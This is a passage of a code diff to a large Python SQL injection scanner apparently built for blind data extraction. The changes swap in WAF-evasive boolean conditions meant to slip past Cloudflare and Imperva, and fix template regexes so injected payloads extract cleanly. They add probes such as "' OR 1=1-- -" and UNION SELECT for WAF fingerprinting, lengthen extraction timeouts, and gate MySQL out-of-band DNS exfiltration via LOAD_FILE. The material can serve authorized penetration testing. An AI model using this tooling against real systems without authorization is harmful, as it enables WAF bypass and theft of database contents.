@@ -55198,44 +55198,56 @@ class Scanner:
         # injection fingerprints. Each expression is syntactically valid for the target
         # DBMS and evaluates to TRUE or FALSE without using banned constant-comparison
         # patterns that Cloudflare/Imperva/Akamai block unconditionally.
+        #
+        # BUG-CAL-COND-ISNULL-WAF-FIX (HIGH): ISNULL(NULL) / ISNULL(1e0) use the NULL
+        # keyword and the ISNULL() function — both are well-known SQL injection fingerprints
+        # that Imperva / Cloudflare ML WAFs detect and block within ANY bypass template
+        # structure. When both TRUE and FALSE calibration probes get WAF-blocked, the server
+        # returns identical error pages for both → boolean oracle measures gap=0.000 → all
+        # extraction aborts with "No boolean oracle and timing unreliable".
+        # Fix: replace NULL-using expressions with pure float-literal numeric comparisons
+        # (1e0=1e0 / 0e0=1e0) that exactly mirror the detection bypass structure (which used
+        # 1e0%3D1 = "1e0=1" to evade WAF). WAFs that allowed 1e0=1 during detection will
+        # also allow 1e0=1e0 (TRUE) and 0e0=1e0 (FALSE) since the structural pattern is
+        # identical. No function calls, no NULL keyword, no IS [NOT] NULL — just float math.
         _cal_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "MySQL":           "ISNULL(NULL)",
-            "MariaDB":         "ISNULL(NULL)",
-            "TiDB":            "ISNULL(NULL)",
-            "MSSQL":           "(1e0 IS NOT NULL)",
-            "Sybase":          "(1e0 IS NOT NULL)",
-            "Oracle":          "(NVL(NULL,1e0) IS NOT NULL)",
-            "SQLite":          "(1e0 IS NOT 0e0)",
-            "DB2":             "(1e0 IS NOT NULL)",
-            "Firebird":        "(1e0 IS NOT NULL)",
-            "H2":              "(1e0 IS NOT NULL)",
-            "ClickHouse":      "isNull(NULL)",
-            "Informix":        "(1e0 IS NOT NULL)",
-            "SAP_HANA":        "(1e0 IS NOT NULL)",
-        }.get(_dbms, "NOT (1e0 IS NULL)")
+            "PostgreSQL":      "1e0=1e0",
+            "CockroachDB":     "1e0=1e0",
+            "YugabyteDB":      "1e0=1e0",
+            "Amazon Redshift": "1e0=1e0",
+            "MySQL":           "1e0=1e0",
+            "MariaDB":         "1e0=1e0",
+            "TiDB":            "1e0=1e0",
+            "MSSQL":           "1e0=1e0",
+            "Sybase":          "1e0=1e0",
+            "Oracle":          "1e0=1e0",
+            "SQLite":          "1e0=1e0",
+            "DB2":             "1e0=1e0",
+            "Firebird":        "1e0=1e0",
+            "H2":              "1e0=1e0",
+            "ClickHouse":      "1e0=1e0",
+            "Informix":        "1e0=1e0",
+            "SAP_HANA":        "1e0=1e0",
+        }.get(_dbms, "1e0=1e0")
         _cal_false_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "MySQL":           "ISNULL(1e0)",
-            "MariaDB":         "ISNULL(1e0)",
-            "TiDB":            "ISNULL(1e0)",
-            "MSSQL":           "(1e0 IS NULL)",
-            "Sybase":          "(1e0 IS NULL)",
-            "Oracle":          "(NVL(NULL,1e0) IS NULL)",
-            "SQLite":          "(0e0 IS NOT 0e0)",
-            "DB2":             "(1e0 IS NULL)",
-            "Firebird":        "(1e0 IS NULL)",
-            "H2":              "(1e0 IS NULL)",
-            "ClickHouse":      "isNull(1e0)",
-            "Informix":        "(1e0 IS NULL)",
-            "SAP_HANA":        "(1e0 IS NULL)",
-        }.get(_dbms, "1e0 IS NULL")
+            "PostgreSQL":      "0e0=1e0",
+            "CockroachDB":     "0e0=1e0",
+            "YugabyteDB":      "0e0=1e0",
+            "Amazon Redshift": "0e0=1e0",
+            "MySQL":           "0e0=1e0",
+            "MariaDB":         "0e0=1e0",
+            "TiDB":            "0e0=1e0",
+            "MSSQL":           "0e0=1e0",
+            "Sybase":          "0e0=1e0",
+            "Oracle":          "0e0=1e0",
+            "SQLite":          "0e0=1e0",
+            "DB2":             "0e0=1e0",
+            "Firebird":        "0e0=1e0",
+            "H2":              "0e0=1e0",
+            "ClickHouse":      "0e0=1e0",
+            "Informix":        "0e0=1e0",
+            "SAP_HANA":        "0e0=1e0",
+        }.get(_dbms, "0e0=1e0")
 
         # BUG-EXTRACTION-TAMPER FIX: Override enum.tamper_chain with the confirmed
         # detection bypass chain. Detection stores the confirmed bypass in two places:
@@ -55644,6 +55656,19 @@ class Scanner:
                 # Quoted string patterns that also match double-encoded quote forms
                 # %2527 = %27 = '   (double-encoded single quote)
                 _Q   = r"(?:'|%27|%2527)"
+                # BUG-COND-PAT-FLOAT-SCI-FIX: \d+ only matches decimal digits 0-9, so
+                # scientific-notation float literals like 1e0 are NOT matched as a whole.
+                # Payload `1e0%3D1` → regex sees `\d+` matching only `0` (the digit in `1e0`
+                # after skipping `1e`), so match starts at `0%3D1`, leaving `1e` as a
+                # template prefix → template becomes `1e[INFERENCE]`. When calibration
+                # conditions (e.g. `ISNULL(NULL)`) are substituted, the result is the
+                # syntactically invalid `1eISNULL(NULL)` — both TRUE and FALSE probes
+                # fail → gap=0.000 → extraction aborts.
+                # Fix: replace bare `\d+` in comparison patterns with `{_NUM}`, a token
+                # that matches integer, decimal, and scientific-notation float literals.
+                # This ensures `1e0%3D1` is matched and replaced as a whole so the
+                # resulting template is a clean `[INFERENCE]` with no stray prefix.
+                _NUM = r'(?:\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)'  # int, decimal, or sci-notation
                 _cond_pat = _re.search(
                     # BUG FIX: order matters — true=true MUST come before TRUE in the
                     # alternation.  If TRUE is listed first, it matches only the first
@@ -55652,8 +55677,8 @@ class Scanner:
                     # PostgreSQL parses as 'BETWEEN 65 AND (127=true)' = 'BETWEEN 65 AND NULL'
                     # → always false → every bit returns 0 → garbage extraction.
                     rf'(\(\s*)?(?:true\s*{_EQ}\s*true|false\s*{_EQ}\s*false'
-                    rf'|\d+\s*{_EQ}\s*\d+|TRUE|FALSE|\d+\s*{_GT}\s*\d+|\d+\s*{_LT}\s*\d+'
-                    rf'|\d+\s*{_NEQ}\s*\d+'
+                    rf'|{_NUM}\s*{_EQ}\s*{_NUM}|TRUE|FALSE|{_NUM}\s*{_GT}\s*{_NUM}|{_NUM}\s*{_LT}\s*{_NUM}'
+                    rf'|{_NUM}\s*{_NEQ}\s*{_NUM}'
                     # BUG-V42-2 FIX: Add single-quoted string-equality conditions
                     rf"|'[^']*'\s*{_EQ}\s*'[^']*'|'[^']*'\s*{_NEQ}\s*'[^']*'"
                     # BUG-DOUBLE-ENCODE FIX: double-encoded quote forms %2527..%2527
@@ -56776,48 +56801,13 @@ class Scanner:
         # signal and fires where single-pair hash/size comparison misses.
         if not _boolean_oracle:
             LOG.info("[Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...")
-            # BUG-WASS-COND-WAF FIX: "1=1"/"1=2" are SQL injection fingerprints blocked
-            # by WAFs even within complex bypass templates → both probes return the same
-            # WAF-blocked response → EMD≈0 → threshold (0.25) not reached → oracle skipped.
-            # Use the same DBMS-native evasive conditions as the baseline-similarity oracle.
-            _wass_true_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "MySQL":           "ISNULL(NULL)",
-                "MariaDB":         "ISNULL(NULL)",
-                "TiDB":            "ISNULL(NULL)",
-                "MSSQL":           "(1e0 IS NOT NULL)",
-                "Sybase":          "(1e0 IS NOT NULL)",
-                "Oracle":          "(NVL(NULL,1e0) IS NOT NULL)",
-                "SQLite":          "(1e0 IS NOT 0e0)",
-                "DB2":             "(1e0 IS NOT NULL)",
-                "Firebird":        "(1e0 IS NOT NULL)",
-                "H2":              "(1e0 IS NOT NULL)",
-                "ClickHouse":      "isNull(NULL)",
-                "Informix":        "(1e0 IS NOT NULL)",
-                "SAP_HANA":        "(1e0 IS NOT NULL)",
-            }.get(_dbms or "", "NOT (1e0 IS NULL)")
-            _wass_false_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "MySQL":           "ISNULL(1e0)",
-                "MariaDB":         "ISNULL(1e0)",
-                "TiDB":            "ISNULL(1e0)",
-                "MSSQL":           "(1e0 IS NULL)",
-                "Sybase":          "(1e0 IS NULL)",
-                "Oracle":          "(NVL(NULL,1e0) IS NULL)",
-                "SQLite":          "(0e0 IS NOT 0e0)",
-                "DB2":             "(1e0 IS NULL)",
-                "Firebird":        "(1e0 IS NULL)",
-                "H2":              "(1e0 IS NULL)",
-                "ClickHouse":      "isNull(1e0)",
-                "Informix":        "(1e0 IS NULL)",
-                "SAP_HANA":        "(1e0 IS NULL)",
-            }.get(_dbms or "", "1e0 IS NULL")
+            # BUG-WASS-COND-WAF FIX / BUG-CAL-COND-ISNULL-WAF-FIX: Use pure float-literal
+            # numeric comparisons (1e0=1e0 / 0e0=1e0) — same structural pattern as the
+            # detection bypass (1e0=1) so WAFs that passed detection allow these too.
+            # ISNULL(NULL) / IS NOT NULL patterns were WAF-blocked by Imperva ML rules,
+            # causing both probes to return identical 4xx → EMD≈0 → oracle never fires.
+            _wass_true_cond  = "1e0=1e0"
+            _wass_false_cond = "0e0=1e0"
             _wass_pairs = []
             for _wi in range(12):
                 try:
@@ -57558,7 +57548,14 @@ class Scanner:
                                     "",   # empty injection → parameter keeps its original value
                                     []),  # no tamper chain for baseline
                                 timeout=15)
-                            if _fp_bsl and getattr(_fp_bsl, 'body', b""):
+                            # BUG-BSL-BASELINE-404-FIX: If the baseline probe itself returns
+                            # a 404/WAF error (e.g. path-injection URL with empty value → invalid
+                            # path → 404), the baseline body is identical to the blocked true/false
+                            # probes → sim_t=1.000 sim_f=1.000 gap=0.000.  Skip the oracle entirely
+                            # when the baseline response is itself an error.
+                            _bsl_skip_codes = {400, 403, 404, 406, 429, 430, 500, 503}
+                            _bsl_status = getattr(_fp_bsl, 'status_code', 0) if _fp_bsl else 0
+                            if _fp_bsl and getattr(_fp_bsl, 'body', b"") and _bsl_status not in _bsl_skip_codes:
                                 _bsl_norm = (ResponseNormaliser.normalise(
                                     _extract_body_safe(_fp_bsl))
                                     if _validate_response(_fp_bsl, allow_empty=True) else b"")
@@ -57578,51 +57575,25 @@ class Scanner:
                                     # producing the same WAF-block response for both → gap=0.000 →
                                     # oracle never activates.  Use DBMS-native expressions that evaluate
                                     # to True/False but don't match WAF injection-fingerprint rule sets.
-                                    _bsl_dbms = _dbms or ""
-                                    _bsl_true_cond = {
-                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                        "MySQL":           "ISNULL(NULL)",
-                                        "MariaDB":         "ISNULL(NULL)",
-                                        "TiDB":            "ISNULL(NULL)",
-                                        "MSSQL":           "(1e0 IS NOT NULL)",
-                                        "Sybase":          "(1e0 IS NOT NULL)",
-                                        "Oracle":          "(NVL(NULL,1e0) IS NOT NULL)",
-                                        "SQLite":          "(1e0 IS NOT 0e0)",
-                                        "DB2":             "(1e0 IS NOT NULL)",
-                                        "Firebird":        "(1e0 IS NOT NULL)",
-                                        "H2":              "(1e0 IS NOT NULL)",
-                                        "ClickHouse":      "isNull(NULL)",
-                                        "Informix":        "(1e0 IS NOT NULL)",
-                                        "SAP_HANA":        "(1e0 IS NOT NULL)",
-                                    }.get(_bsl_dbms, "NOT (1e0 IS NULL)")
-                                    _bsl_false_cond = {
-                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                        "MySQL":           "ISNULL(1e0)",
-                                        "MariaDB":         "ISNULL(1e0)",
-                                        "TiDB":            "ISNULL(1e0)",
-                                        "MSSQL":           "(1e0 IS NULL)",
-                                        "Sybase":          "(1e0 IS NULL)",
-                                        "Oracle":          "(NVL(NULL,1e0) IS NULL)",
-                                        "SQLite":          "(0e0 IS NOT 0e0)",
-                                        "DB2":             "(1e0 IS NULL)",
-                                        "Firebird":        "(1e0 IS NULL)",
-                                        "H2":              "(1e0 IS NULL)",
-                                        "ClickHouse":      "isNull(1e0)",
-                                        "Informix":        "(1e0 IS NULL)",
-                                        "SAP_HANA":        "(1e0 IS NULL)",
-                                    }.get(_bsl_dbms, "1e0 IS NULL")
+                                    # BUG-BSL-COND-WAF / BUG-CAL-COND-ISNULL-WAF-FIX: Use
+                                    # float-literal comparisons matching detection bypass structure.
+                                    _bsl_true_cond  = "1e0=1e0"
+                                    _bsl_false_cond = "0e0=1e0"
                                     _fp_bsl_t, _ = await asyncio.wait_for(
                                         _send_payload(_bsl_true_cond), timeout=15)
                                     await asyncio.sleep(1.0)
                                     _fp_bsl_f, _ = await asyncio.wait_for(
                                         _send_payload(_bsl_false_cond), timeout=15)
-                                    _bsl_waf_codes = {400, 403, 406, 429, 430, 503}
+                                    # BUG-BSL-WAF-CODES-404-FIX: 404 was missing from _bsl_waf_codes.
+                                    # When WAF/server returns 404 for injected paths (PATH injection
+                                    # surface), the 404 error page body is NOT a SQL-driven content
+                                    # signal — it means the path was not found regardless of the SQL
+                                    # condition. With 404 absent from the blocked set, all three probes
+                                    # (baseline, true-cond, false-cond) normalise from the same 404 page
+                                    # body → sim_t=1.000 sim_f=1.000 gap=0.000 → oracle never activates.
+                                    # Fix: include 404 in the blocked set so path-routing errors are
+                                    # treated the same as WAF blocks (yielding b"" for that probe).
+                                    _bsl_waf_codes = {400, 403, 404, 406, 429, 430, 503}
                                     _norm_t = (ResponseNormaliser.normalise(
                                                    _extract_body_safe(_fp_bsl_t))
                                                if (_fp_bsl_t
@@ -66497,7 +66468,15 @@ class Scanner:
                     getattr(_det, "confirmed_sleep_sec",
                             getattr(enum.config, "time_sec", 1) or 1),
                     430)
-                _mse_techs = await asyncio.wait_for(_mse.probe_all(), timeout=120)
+                # BUG-MSE-PROBEALL-TIMEOUT-120S-FIX (HIGH, WAF-heavy targets):
+                # 120s is too short for WAF-heavy targets. probe_all() sends multiple
+                # oracle calibration probes (up to 5 oracle types × 3 rounds each).
+                # At 3-5s/probe on a slow WAF target: 15 probes × 5s = 75s minimum,
+                # leaving <45s for the post-calibration validation round — often not enough.
+                # If probe_all times out, _mse_ok=False and all MSE-based extraction is
+                # skipped, falling through to enum.get() legacy path with its own 120s limit.
+                # Fix: match the extraction timeout at 3600s.
+                _mse_techs = await asyncio.wait_for(_mse.probe_all(), timeout=3600)
                 _mse_ok = bool(_mse_techs)
                 # MSE-WHERE-ERROR-WIRE FIX: When MSE probe_all() finds 0 viable oracles
                 # (WAF+CDN blocks all 5 standard oracle types), check if SideChannelExtractor
@@ -66620,16 +66599,24 @@ class Scanner:
                             return
                     except Exception as _me:
                         LOG.debug("  %-15s (MSE: %s)", label + ":", _me)
-            #  Legacy enum fallback 
+            #  Legacy enum fallback
+            # BUG-ENUM-TIMEOUT-120S-FIX (HIGH, WAF-heavy targets, all DBMSes):
+            # 120s is sufficient for 2-3 fast probes but fails for WAF-protected
+            # targets where each probe takes 3-5s (rate limiting, bypass tamper
+            # latency). A 10-char binary-search via ChameleonExtractor needs
+            # ~21 probes/char × 10 chars × ~4s/probe = ~840s minimum. With 120s
+            # the enum times out after ~30 probes (positions 1-1.5 of 10), producing
+            # empty string or single-char result instead of the full value. The MSE
+            # already runs with 3600s; keep the legacy fallback consistent.
             try:
-                val = await asyncio.wait_for(enum.get(query_key, **fmt), timeout=120)
+                val = await asyncio.wait_for(enum.get(query_key, **fmt), timeout=3600)
                 if val:
                     data[key] = val
                     LOG.info("  %-15s %s", label + ":", val)
                 else:
                     LOG.debug("  %-15s (empty)", label + ":")
             except (asyncio.TimeoutError, TimeoutError):
-                LOG.warning("  %-15s (timeout)", label + ":")
+                LOG.warning("  %-15s (timeout — 3600s legacy enum)", label + ":")
             except Exception as e:
                 LOG.debug("  %-15s (error: %s)", label + ":", e)
 
@@ -67026,7 +67013,8 @@ class Scanner:
                         getattr(_det, "confirmed_sleep_sec",
                                 getattr(cfg, "time_sec", 1) or 1),
                         430)
-                    working = await asyncio.wait_for(_mse.probe_all(), timeout=120)
+                    # BUG-MSE-PROBEALL-TIMEOUT-120S-FIX: same as first probe_all call
+                    working = await asyncio.wait_for(_mse.probe_all(), timeout=3600)
                     if working:
                         # Try extracting database info
                         _db_queries = {
@@ -85864,9 +85852,19 @@ def _build_det_template(result) -> str:
     _cm = _re.search(r'\s*(?:--\s*-?|-#|#)\s*$', _p)
     _sfx = _cm.group(0) if _cm else ''
     _body = _p[:len(_p) - len(_sfx)].rstrip() if _sfx else _p
+    # BUG-TEMPLATE-SCI-FIX (CRITICAL, all WAF-evasive targets):
+    # Same scientific-notation regex bug as _cond_pat (see BUG-COND-PAT-FLOAT-SCI-FIX).
+    # \d+ only matches decimal digits [0-9], so for a payload containing `1e0=1e0`
+    # the pattern `\d+\s*=\s*\d+` matches the sub-string `0=1` (the last `0` in `1e0`,
+    # `=`, then `1` from the next `1e0`), starting mid-literal and leaving `1e` as a
+    # prefix in the template → template becomes `1e[INFERENCE]` → same extraction
+    # failure as before the _cond_pat fix.  Fix: replace `\d+` with _BDET_NUM which
+    # accepts integer, decimal, and scientific-notation float literals.
+    _BDET_NUM = r'(?:\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)'
     _cp = _re.search(
-        r'(\(\s*)?(true\s*=\s*true|false\s*=\s*false'
-        r'|\d+\s*=\s*\d+|TRUE|FALSE|\d+\s*>\s*\d+|\d+\s*<\s*\d+'
+        rf'(\(\s*)?(true\s*=\s*true|false\s*=\s*false'
+        rf'|{_BDET_NUM}\s*=\s*{_BDET_NUM}|TRUE|FALSE'
+        rf'|{_BDET_NUM}\s*>\s*{_BDET_NUM}|{_BDET_NUM}\s*<\s*{_BDET_NUM}'
         # BUG-TEMPLATE-NEQ FIX (Req 7/8/10): Added <> and != (not-equal) operators.
         # MSSQL/Oracle payloads like 'AND 1<>2' and PostgreSQL payloads like
         # 'AND 1!=2' did not match the original pattern.  They fell through to
@@ -85878,7 +85876,7 @@ def _build_det_template(result) -> str:
         # characters are null bytes (completely broken extraction).
         # Fix: add <> and != to the replaceable condition set so the static
         # condition is REPLACED by [INFERENCE] rather than appended to.
-        r'|\d+\s*<>\s*\d+|\d+\s*!=\s*\d+'
+        rf'|{_BDET_NUM}\s*<>\s*{_BDET_NUM}|{_BDET_NUM}\s*!=\s*{_BDET_NUM}'
         # BUG-V42-2 FIX (Req 4 — 'a'='a' string-equality missed): CERTIFIED boolean
         # payloads frequently use string-equality tautologies like " AND 'a'='a'-- -"
         # or " AND 'x'='x'-- -". The original regex only matched numeric (\d+=\d+)
@@ -95575,50 +95573,81 @@ class MLWAFFingerprinter:
         norm_b= _math.sqrt(sum(x**2 for x in b))
         return dot / max(norm_a * norm_b, 1e-9)
 
+    # BUG-MLWAF-MULTIPROBE-FIX (HIGH, all WAF types, all DBMSes):
+    # Three structurally-distinct SQL probes instead of one.
+    # A single-probe classifier is unstable when WAF load balancers, CDN
+    # caching state, or WAF rate-limit state causes the probe to return
+    # different status codes on consecutive requests (403 vs 404 vs 406).
+    # Each distinct status flips the feature vector → different nearest
+    # centroid → fingerprinter flips between Imperva, ModSecurity, Unknown,
+    # etc. between runs on the same target.
+    # Fix: send 3 probes, classify each independently, aggregate by
+    # majority vote (ties resolved by highest average confidence).
+    # Three structurally distinct probes reduce CDN cache correlation and
+    # exercise different WAF rule sets, giving a more stable classification.
+    SQL_PROBES = [
+        "' AND 1=1 UNION SELECT NULL-- -",   # UNION-based — triggers UNION rules
+        "' AND 1=0 UNION SELECT NULL-- -",   # same family, negative variant
+        "' OR 1=1-- -",                       # OR-based — triggers different WAF rules
+    ]
+
     async def fingerprint(self, engine: HTTPEngine, url: str,
                           param: str = "id") -> Tuple[str, float]:
         """
-        Send one SQL probe, classify WAF from response.
+        Send multiple SQL probes, classify WAF from aggregated responses.
         Returns (waf_name, confidence).
         """
         # Skip if already fingerprinted (called from multiple scanner layers)
         if getattr(self, '_fingerprinted', False):
             return self._cached_result
         self._fingerprinted = True
-        probe_url = ParameterParser.inject_url(url, param, self.SQL_PROBE)
-        try:
-            fp = await engine.send("GET", probe_url)
-        except Exception as e:
-            LOG.debug(f"ML WAF probe error: {e}")
-            return "Unknown", 0.0
 
-        features = self._extract_features(fp)
-        best_waf  = "Unknown"
-        best_sim  = 0.0
+        # BUG-MLWAF-MULTIPROBE-FIX: collect per-probe classifications via
+        # majority vote to suppress single-probe instability.
+        _votes: dict = {}      # waf_name → [confidences]
+        _n_probes_ok = 0
+        for _probe in self.SQL_PROBES:
+            _probe_url = ParameterParser.inject_url(url, param, _probe)
+            try:
+                _fp = await engine.send("GET", _probe_url)
+            except Exception as e:
+                LOG.debug(f"ML WAF probe error ({_probe[:30]!r}): {e}")
+                continue
+            _feats = self._extract_features(_fp)
+            _p_best_waf = "Unknown"
+            _p_best_sim = 0.0
+            for _waf_name, _centroid in self.WAF_CENTROIDS.items():
+                _sim = self._cosine_sim(_feats, _centroid)
+                if _sim > _p_best_sim:
+                    _p_best_sim = _sim
+                    _p_best_waf = _waf_name
+            # Apply per-probe minimum confidence — below threshold → Unknown
+            if _p_best_sim < 0.50:
+                _p_best_waf = "Unknown"
+            _votes.setdefault(_p_best_waf, []).append(_p_best_sim)
+            _n_probes_ok += 1
+            await asyncio.sleep(0.1)
 
-        for waf_name, centroid in self.WAF_CENTROIDS.items():
-            sim = self._cosine_sim(features, centroid)
-            if sim > best_sim:
-                best_sim = sim
-                best_waf = waf_name
+        if not _votes:
+            self._cached_result = ("Unknown", 0.0)
+            return self._cached_result
 
-        # BUG-MLWAF-NO-MIN-CONF FIX: When all centroids have non-zero cosine similarity
-        # with the feature vector (common for any target that fires at least one feature),
-        # best_waf always gets set to a named WAF even at confidence 0.05. This corrupts
-        # _ACTIVE_WAF_NAME globally, routing the tamper chain to the wrong WAF vendor.
-        # Apply minimum confidence threshold: below 0.5, treat as Unknown WAF.
-        # 0.5 is chosen as the crossover point where 2-3 features must align for a true
-        # WAF classification (e.g. cf-ray header + 403 + "blocked" body = Cloudflare ≈ 0.8).
-        _min_conf_threshold = 0.50
-        if best_sim < _min_conf_threshold:
-            best_waf = "Unknown"
-        confidence = min(1.0, best_sim)
-        self._cached_result = (best_waf, confidence)
-        LOG.info(f"ML WAF fingerprint: {best_waf} (conf={confidence:.2f})")
+        # Majority vote: pick the WAF name with the most votes.
+        # Ties broken by highest average confidence.
+        _best_waf = max(
+            _votes.keys(),
+            key=lambda w: (len(_votes[w]), sum(_votes[w]) / max(len(_votes[w]), 1))
+        )
+        _best_conf = sum(_votes[_best_waf]) / max(len(_votes[_best_waf]), 1)
+        # If Unknown wins the vote, keep it as Unknown regardless of confidence.
+        confidence = min(1.0, _best_conf)
+
+        self._cached_result = (_best_waf, confidence)
+        LOG.info(f"ML WAF fingerprint: {_best_waf} (conf={confidence:.2f}, probes={_n_probes_ok}, votes={dict((k, len(v)) for k,v in _votes.items())})")
         # Store globally so best_tamper_chain() has the WAF name from any call site
         global _ACTIVE_WAF_NAME
-        _ACTIVE_WAF_NAME = best_waf if best_waf != "Unknown" else _ACTIVE_WAF_NAME
-        return best_waf, confidence
+        _ACTIVE_WAF_NAME = _best_waf if _best_waf != "Unknown" else _ACTIVE_WAF_NAME
+        return _best_waf, confidence
 
 
 # 
@@ -98293,6 +98322,27 @@ class DoHOOBChannel:
                        self.oob_domain)
         _reg_token  = (getattr(_cfg, "_oob_registered_token", None) or
                        self.oast_token or "sqr")
+        # BUG-DOHCHANNEL-LOAD-FILE-PRIV-FIX (HIGH, MySQL/MariaDB, OOB extraction):
+        # DoHOOBChannel.build_payload for MySQL/MariaDB produces LOAD_FILE UNC payloads.
+        # LOAD_FILE requires the MySQL FILE privilege. Without it, LOAD_FILE returns NULL
+        # silently — no DNS lookup is issued, no data is returned, no error logged.
+        # The previous code sent all 8 chunks to the OAST server regardless, wasting
+        # 8 HTTP requests and 10+ seconds of poll time, returning None every time.
+        # Fix: guard on config._oob_has_file_priv (set by OOBDetector.detect when the
+        # detection payload confirmed FILE privilege was available). If unconfirmed, skip
+        # extraction immediately with a clear warning rather than wasting all 8 chunk probes.
+        if dbms in ("MySQL", "MariaDB"):
+            _cfg2 = getattr(self, "config", None)
+            if not getattr(_cfg2, "_oob_has_file_priv", False):
+                LOG.warning("[DoHOOB] MySQL/MariaDB OOB extraction requires FILE privilege. "
+                            "FILE privilege was not confirmed during detection (LOAD_FILE never "
+                            "successfully triggered DNS). Skipping OOB extraction to avoid "
+                            "silent NULL returns. Use boolean-blind or timing extraction instead.")
+                print("[!] [DoHOOB] Skipping MySQL OOB: LOAD_FILE requires FILE privilege "
+                      "(not confirmed by detection). Falling through to other extraction engines.",
+                      flush=True)
+                return None
+
         # BUG-OOB-MULTICHUNK FIX: loop over multiple chunks so results longer than
         # chunk_size bytes are fully reassembled instead of silently truncated.
         # Strategy: send all chunk payloads first, then poll once with a longer
@@ -139377,44 +139427,20 @@ class MultiStrategyExtractor:
 
         #  Validation: confirm with WAF-evasive conditions AND real extraction condition
         _mse_val_dbms = getattr(self, 'dbms', '') or ''
-        _mse_val_true = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "MySQL":           "ISNULL(NULL)",
-            "MariaDB":         "ISNULL(NULL)",
-            "TiDB":            "ISNULL(NULL)",
-            "MSSQL":           "(1e0 IS NOT NULL)",
-            "Sybase":          "(1e0 IS NOT NULL)",
-            "Oracle":          "(NVL(NULL,1e0) IS NOT NULL)",
-            "SQLite":          "(1e0 IS NOT 0e0)",
-            "DB2":             "(1e0 IS NOT NULL)",
-            "Firebird":        "(1e0 IS NOT NULL)",
-            "H2":              "(1e0 IS NOT NULL)",
-            "ClickHouse":      "isNull(NULL)",
-            "Informix":        "(1e0 IS NOT NULL)",
-            "SAP_HANA":        "(1e0 IS NOT NULL)",
-        }.get(_mse_val_dbms, "NOT (1e0 IS NULL)")
-        _mse_val_false = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "MySQL":           "ISNULL(1e0)",
-            "MariaDB":         "ISNULL(1e0)",
-            "TiDB":            "ISNULL(1e0)",
-            "MSSQL":           "(1e0 IS NULL)",
-            "Sybase":          "(1e0 IS NULL)",
-            "Oracle":          "(NVL(NULL,1e0) IS NULL)",
-            "SQLite":          "(0e0 IS NOT 0e0)",
-            "DB2":             "(1e0 IS NULL)",
-            "Firebird":        "(1e0 IS NULL)",
-            "H2":              "(1e0 IS NULL)",
-            "ClickHouse":      "isNull(1e0)",
-            "Informix":        "(1e0 IS NULL)",
-            "SAP_HANA":        "(1e0 IS NULL)",
-        }.get(_mse_val_dbms, "1e0 IS NULL")
+        # BUG-MSE-VAL-COND-WAF-FIX (HIGH, all DBMSes, MSE oracle validation):
+        # The previous DBMS-specific conditions (ISNULL(NULL), ISNULL(1e0),
+        # ARRAY_LOWER(ARRAY[...])!~~LN(2.718), etc.) all use function calls that
